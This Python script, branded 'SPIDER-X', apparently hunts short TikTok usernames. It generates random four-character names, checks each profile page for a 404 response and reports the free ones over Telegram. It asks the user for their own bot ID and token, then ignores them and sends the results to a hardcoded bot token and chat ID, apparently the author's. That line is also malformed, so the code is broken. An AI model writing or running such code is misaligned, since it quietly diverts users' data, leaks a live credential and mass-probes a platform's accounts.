import requests, random, datetime,pyfiglet
from colorama import Fore
import webbrowser
webbrowser.open('https://t.me/SpidrX')
C = "\033[1;97m" #ابيض
bnrx = pyfiglet.figlet_format("SPIDER-X")
print("\x1b[1;33m—" * 60)
print(C+bnrx)
print("\x1b[1;33m—" * 60)
R = Fore.RED
P = Fore.GREEN
s = Fore.LIGHTRED_EX
y = Fore.YELLOW
fz = datetime.datetime.now()

sa="4"
if sa =="4":
    uesr = ''   
    chars2 = 'qwertyuiopasdfghjklzxcvbnm1234567890._'
    amount = 5000
    amount = int(amount)

    length2 = 4
    length2 = int(length2)

    for password in range(amount):
        password = ''

        for item in range(length2):
            password = ''
        for item in range(length2):
            password += random.choice(chars2)

        
        with open('user.txt', 'a') as x:
            x.write(uesr + password + '\n')
j = requests.get('https://pastebin.com/raw/jsXm5HCA').text
x2 = requests.get('https://pastebin.com/raw/08NqbfeS').text
use="user.txt"
ID = input(R+"حط ايدي بوتك :")
token = input(R+' حط توكن بوتك :')
headers={
"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
"Connection": "close",
"Host": "www.tiktok.com",
"Accept-Encoding": "gzip, deflate",
"Cache-Control": "max-age=0"}
file = open(use, "r")
while True:
	Check = file.readline().split('\n')[0]
	if Check == '':
		break
	tiklog = f'https://www.tiktok.com/@{Check}'
	rq = requests.get(tiklog, headers=headers)
	if rq.status_code == 404:
		print(P+'[+] Available >> {}'.format(Check))
		tele = (
			f'https://api.telegram.org/bot{6724600052:AAFNBm-Al9ViQ9ik4_VbaNddk5wuZcIYb2Q}/sendMessage?chat_id={6323781171}&text={j}\n𖡃 𝚄𝚂𝙴𝚁:{Check}\n{x2}')
		re = requests.post(tele)
		with open('Tik-HuNt.txt', 'a') as x:
			x.write(Check + '\n')
	elif rq.status_code == 200:
		print(s+'[-] NoT Available >> {}'.format(Check))






